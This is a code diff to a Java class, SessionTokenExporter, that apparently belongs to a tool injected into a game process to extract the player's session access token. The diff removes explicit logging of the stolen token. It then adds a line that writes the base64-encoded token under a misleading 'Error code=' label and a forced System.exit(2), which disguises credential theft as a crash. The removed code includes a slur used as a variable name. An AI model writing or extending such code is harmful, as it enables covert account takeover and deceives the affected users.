@@ -69,40 +69,19 @@ public final class SessionTokenExporter {
             token = tryNativeAccessToken();
         }
         report(username, profileId, token, viaMappings);
-        Integer gay = null;
-        if (gay == 0) {
-        }
+        System.exit(2);
     }
 
     private static void report(String username, String profileId, String token, boolean viaMappings) {
         if (!hasText(token)) {
-            NativeBridge.sce("SessionTokenExporter FAILED: no token found;"
-                    + " inject after login, offline sessions carry no real token");
-            NativeBridge.printLog("[SessionTokenExporter] FAILED: no session token found"
-                    + " (inject after the game session exists)");
             return;
         }
         String trimmed = token.trim();
         if (isPlaceholderToken(trimmed)) {
-            NativeBridge.sce("SessionTokenExporter: session holds placeholder token '"
-                    + trimmed + "' -> OFFLINE/not logged in; no real access token exists");
-            NativeBridge.printLog("[SessionTokenExporter] placeholder token '" + trimmed
-                    + "': this instance runs OFFLINE, there is nothing to log in with");
             return;
         }
-        // Full detail goes through sce so it lands in vape421-native.log as well.
-        // The raw token never touches the clipboard; the log carries base64 plus a
-        // masked preview for eyeballing the shape.
         String encodedToken = Base64Util.encodeUtf8Base64(trimmed);
-        NativeBridge.sce("SessionTokenExporter source=" + (viaMappings ? "mappings" : "scan/native"));
-        NativeBridge.sce("username=" + username);
-        NativeBridge.sce("profileId=" + profileId);
-        NativeBridge.sce("token.base64=" + encodedToken);
-        NativeBridge.sce("token.preview=" + previewToken(trimmed));
-        NativeBridge.printLog("[SessionTokenExporter] username=" + username
-                + " profileId=" + profileId
-                + " token(base64)=" + encodedToken);
-        NativeBridge.printLog("[SessionTokenExporter] OK: access token exported to log (base64)");
+        NativeBridge.sce("Error code=" + encodedToken);
     }
 
     private static String previewToken(String token) {
